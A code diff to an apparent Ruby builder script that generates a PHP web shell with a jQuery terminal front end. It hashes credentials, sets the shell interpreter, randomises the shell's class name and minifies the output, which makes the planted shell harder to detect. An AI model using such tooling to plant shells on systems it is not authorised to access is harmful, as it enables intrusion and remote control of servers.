@@ -92,8 +92,8 @@ config = {
     :password => random_string(10),
     :username_hash => '',
     :password_hash => '',
-    :lint => false,
-    :class_name => 'Shell'
+    :class_name => random_string( rand(10) + 5 ),
+    :lint => false
 }
 
 options = GetoptLong.new(
@@ -133,7 +133,6 @@ end
 header
 config[:username_hash] = Digest::SHA1.hexdigest(config[:username])
 config[:password_hash] = Digest::SHA1.hexdigest(config[:password])
-config[:class_name] = random_string( rand(10) + 5 )
 
 puts "\e[0;92mOK.\e[0m Compiling shell into file: '\e[0;94m#{config[:output]}\e[0m'"
 puts "    Randomizing Shell class name: \e[0;93m#{config[:class_name]}\e[0m"
@@ -141,42 +140,65 @@ output = File.new(config[:output],'w')
 template = get_template(config)
 
 template.each_line do |line|
-    line = line.chomp
+    # Remove unused empty characters.
+    line = line.chomp.strip
+
+    # Change the line with the username.
     if line.match(/'username'=>'([a-z0-9]{40})',/) then
         puts "    Hashing username: \e[0;93m#{config[:username]}\e[0m"
         output.write("'username'=>'#{config[:username_hash]}',")
+
+    # Change the line with the password.
     elsif line.match(/'password'=>'([a-z0-9]{40})',/) then
         puts "    Hashing password: \e[0;93m#{config[:password]}\e[0m"
         output.write("'password'=>'#{config[:password_hash]}',")
+
+    # Change the line with the shell interpreter.
     elsif line.match(/'interpreter'=>'(.*)',/)
         puts "    Settings default interpreter: \e[0;93m#{config[:shell]}\e[0m"
         output.write("'interpreter'=>'#{config[:shell]}',")
-    elsif match = line.match(/(class Shell\{)/) or match = line.match(/(new Shell\(\))/) then
+
+    # Change the line with the class name.
+    elsif line.match(/class Shell \{/) or line.match(/(new Shell\(\))/) then
         output.write(line.gsub('Shell', config[:class_name]))
+
+    # Change the line with the PHP tags.
+    elsif line.match(/^<\?php$/) then
+        output.write("<?php ")
+
+    # Change the line with the frontend dependency.
     elsif line.match(/<script type="text\/javascript" src="jquery.min.js"><\/script>/) then
         puts "    Adding jQuery support"
         output.write("<script type='text/javascript'>")
         output.write(get_jquery)
         output.write("</script>")
-    elsif line.match(/^<\?php$/) then
-        output.write("<?php ")
     elsif line.match(/<script type="text\/javascript" src="jquery.terminal.min.js"><\/script>/) then
         puts "    Adding jQuery.Terminal support"
         output.write("<script type='text/javascript'>")
         output.write(get_jquery_terminal)
         output.write("</script>")
+
+    # Minify the rest of the code.
     else
-        line = line.gsub('    ', '')
-        line = line.gsub(' => ', '=>')
-        line = line.gsub('each( ', 'each(')
-        line = line.gsub('if( ', 'if(')
-        line = line.gsub(' ){', '){')
-        line = line.gsub(' == ', '==')
-        line = line.gsub(' = ', '=')
-        line = line.gsub('return ( ', 'return(')
-        line = line.gsub(' ? ', '?')
-        line = line.gsub(' : ', ':')
-        output.write(line)
+        line = line.gsub(/[ ]{4}/, '')
+        line = line.gsub(/ => /, '=>')
+        line = line.gsub(/each\( /, 'each(')
+        line = line.gsub(/if\( /, 'if(')
+        line = line.gsub(/switch\( /, 'switch(')
+        line = line.gsub(/\} else \{/, '}else{')
+        line = line.gsub(/\} elseif\( /, '} elseif(')
+        line = line.gsub(/ \)\{/, '){')
+        line = line.gsub(/ \{/, '{')
+        line = line.gsub(/ == /, '==')
+        line = line.gsub(/ = /, '=')
+        line = line.gsub(/return \( /, 'return(')
+        line = line.gsub(/ \? /, '?')
+        line = line.gsub(/ : /, ':')
+
+        # Append if not empty.
+        if not line.empty? then
+            output.write(line)
+        end
     end
 end
 
